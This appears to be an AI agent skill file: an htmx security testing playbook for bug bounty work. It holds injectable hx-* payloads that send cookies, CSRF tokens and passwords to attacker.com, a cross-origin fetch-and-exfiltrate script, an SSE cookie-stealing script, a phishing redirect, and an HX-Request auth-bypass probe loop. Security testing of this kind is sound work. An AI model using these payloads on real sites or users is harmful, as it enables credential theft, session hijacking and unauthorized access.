---
name: htmx-security
description: "htmx security testing playbook for bug bounty targets. Covers: hx-get/post/trigger/target attribute injection sinks, CORS + htmx AJAX cross-origin data access, hx-boost + open redirect amplification, SSE endpoint injection via hx-sse, HX-Request fingerprinting, second-order HTML injection via server responses. Load when: htmx detected via hx-* attributes or HX-Request header."
version: 1.0
created: 2026-04-11
owner: cyber-operator
trigger_keywords: "htmx, htmx.org, hx-get, hx-post, hx-trigger, hx-target, hx-boost, hx-sse, hx-ws, hyperscript, HX-Request, alpine htmx"
---

# htmx Security Testing Playbook

## Fingerprinting htmx Targets

```bash
# HTML source — htmx attributes are the fingerprint
curl -s https://target.com | grep -i "hx-get\|hx-post\|htmx\|HX-Request"

# Response headers from htmx-powered endpoints:
curl -sI -H "HX-Request: true" https://target.com/api/widget
# → HX-Trigger: {"showMessage":"loaded"} (htmx event header)
# → HX-Redirect: /login (htmx redirect header)
# → HX-Reswap, HX-Retarget (htmx swap headers)

# Script src fingerprint:
curl -s https://target.com | grep -o 'src="[^"]*htmx[^"]*"'
# → unpkg.com/htmx.org@1.x.x (version visible — check for old vulnerable versions)

# Version extraction:
curl -s https://unpkg.com/htmx.org@1.x.x/dist/htmx.js | head -5 | grep "version"
```

---

## Vector 1 — `hx-*` Attribute Injection Sinks

**Description:** If server responses contain user-controlled content that is rendered as HTML containing htmx attributes, an attacker can inject `hx-get`, `hx-post`, or `hx-trigger` values to exfiltrate data or perform CSRF. This is second-order HTML injection amplified by htmx.

**Why it's worse than regular HTML injection:** htmx attributes make injected elements make automatic HTTP requests with the victim's credentials. A stored `hx-get` is effectively a stored CSRF that fires on page load.

**Test — inject into any stored text field:**
```html
<!-- Payload: inject into username, bio, comment, etc. -->
<div hx-get="https://attacker.com/exfil?c=" 
     hx-trigger="load" 
     hx-include="[name='_token']">
</div>

<!-- Simpler: steal cookies via hx-get -->
<img src="x" hx-get="https://attacker.com/?cookie=" 
     hx-trigger="load"
     hx-vals='js:{cookie: document.cookie}'>
```

**Critical sink attributes:**
| Attribute | What it does if injected | Impact |
|-----------|--------------------------|--------|
| `hx-get="/internal/admin"` | Makes GET to internal endpoint | SSRF / data exfil |
| `hx-post="/api/delete-account"` | Makes POST with victim's session | CSRF |
| `hx-trigger="load"` | Fires immediately on page render | Auto-exploit |
| `hx-target="#output"` | Writes response into page | DOM injection |
| `hx-vals='{"admin":true}'` | Adds arbitrary JSON to requests | Parameter tampering |
| `hx-headers='{"X-Admin":"true"}'` | Adds arbitrary headers | Auth bypass |

---

## Vector 2 — CORS + htmx AJAX Cross-Origin Data Access

**Description:** htmx makes AJAX requests (not navigations). If the server returns sensitive data in htmx partial responses and has a permissive CORS policy, an attacker can steal the response content cross-origin.

**Test:**
```bash
# Does the htmx endpoint return sensitive data with CORS headers?
curl -sI -H "Origin: https://evil.com" \
         -H "HX-Request: true" \
         https://target.com/api/account-details

# Check for:
# Access-Control-Allow-Origin: * (or evil.com)
# Access-Control-Allow-Credentials: true
# → If both present: full cross-origin data theft

# With credentials allowed — steal response:
```

**Cross-origin steal via htmx:**
```html
<script>
// If CORS allows evil.com to read credentialed responses:
fetch('https://target.com/dashboard/user-data', {
  headers: {'HX-Request': 'true'},  // Trigger htmx partial response
  credentials: 'include'
}).then(r => r.text()).then(data => {
  fetch('https://attacker.com/steal?d=' + encodeURIComponent(data));
});
</script>
```

---

## Vector 3 — `hx-boost` + Open Redirect Amplification

**Description:** `hx-boost` converts standard `<a>` and `<form>` elements into AJAX requests. Combined with an open redirect, this can redirect victims to attacker-controlled pages while maintaining the appearance of being on the target domain.

**Test:**
```bash
# 1. Find open redirect on any endpoint:
curl -sI "https://target.com/redirect?to=https://evil.com"
# → Location: https://evil.com

# 2. If page uses hx-boost (check source for hx-boost="true" on body or elements):
# The open redirect becomes an AJAX-based redirect
# 3. Combined with HX-Redirect header injection (if server reflects input):
curl -sI -H "HX-Request: true" "https://target.com/redirect?to=https://phishing.com"
# → HX-Redirect: https://phishing.com
# htmx follows HX-Redirect silently, changing browser location
```

**Phishing amplification:**
```html
<!-- On attacker page, force victim to target.com/redirect?to=phishing -->
<!-- hx-boost makes the redirect happen via fetch, bypassing browser warnings -->
<div hx-get="https://target.com/redirect?to=https://evil.com/fake-login"
     hx-trigger="load"
     hx-target="body">
</div>
```

---

## Vector 4 — SSE Endpoint Injection via `hx-sse`

**Description:** `hx-sse` establishes a Server-Sent Events connection. If the SSE endpoint URL or event data is user-controlled, an attacker can inject arbitrary content into the SSE stream that htmx will render into the page.

**Test:**
```bash
# Find SSE endpoints (look for hx-sse in source):
curl -s https://target.com | grep "hx-sse"
# → hx-sse="connect:/api/events"

# Connect to SSE endpoint manually:
curl -N "https://target.com/api/events?room=123" \
  -H "Accept: text/event-stream" \
  -H "Cookie: session=victim-session"

# Test SSE response injection:
# If room= param is reflected into SSE response headers or data:
curl -N "https://target.com/api/events?room=<div hx-post=/delete-account hx-trigger=load>"
```

**SSE XSS via htmx:**
```
# htmx renders SSE event data as HTML by default
# A server that includes user input in SSE stream enables stored XSS

# Malicious SSE data format:
data: <script>fetch('https://attacker.com/?c='+document.cookie)</script>
event: notification
```

---

## Vector 5 — `HX-Request` Header Fingerprinting (Bypassing Auth)

**Description:** htmx sends `HX-Request: true` on all AJAX requests. Some applications check this header to serve different (often less-protected) responses. Manually adding this header can bypass UI-level restrictions.

**Test:**
```bash
# Without header — normal response (may be auth-gated):
curl "https://target.com/admin/users"
# → 302 redirect to /login

# With HX-Request header — may serve partial HTML without auth check:
curl -H "HX-Request: true" "https://target.com/admin/users"
# → 200 with user list HTML fragment

# Also test HX-Boosted:
curl -H "HX-Request: true" -H "HX-Boosted: true" "https://target.com/admin/export"
```

**Auth bypass test sequence:**
```bash
for path in admin/users admin/settings api/internal dashboard/export; do
  echo "Testing: $path"
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path")
  HTMX_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "HX-Request: true" "https://target.com/$path")
  echo "  Normal: $STATUS | HX-Request: $HTMX_STATUS"
done
```

---

## Vector 6 — `hx-include` Credential Exfiltration

**Description:** `hx-include` adds form values to htmx requests using a CSS selector. If injected into a page, an attacker can create an htmx element that includes CSRF tokens, form data, or other page values in a request to an attacker-controlled server.

```html
<!-- Inject via stored XSS vector: -->
<div hx-post="https://attacker.com/steal"
     hx-trigger="load"
     hx-include="form"       <!-- Include ALL form fields (includes CSRF tokens) -->
     hx-vals='js:{url: window.location.href}'>
</div>

<!-- Or target specific fields: -->
<div hx-post="https://attacker.com/steal"
     hx-trigger="load"
     hx-include="[name='password'],[name='_token'],[name='email']">
</div>
```

---

## Burp Suite Detection Tips

```
1. Enable "Match and Replace" rule: Add HX-Request: true to all requests
   → Reveals htmx-only endpoints not visible in browser

2. Search response bodies for hx-* attributes in returned HTML
   → Indicates server is rendering user-controlled htmx attributes (injection sink)

3. Watch for response headers: HX-Trigger, HX-Redirect, HX-Reswap
   → If any contain reflected input → header injection

4. Check OPTIONS preflight for htmx endpoints
   → CORS misconfiguration on htmx partials is common
```

---

*htmx Security v1.0 | Framework-Specific Bounty Track | Whitehat System*
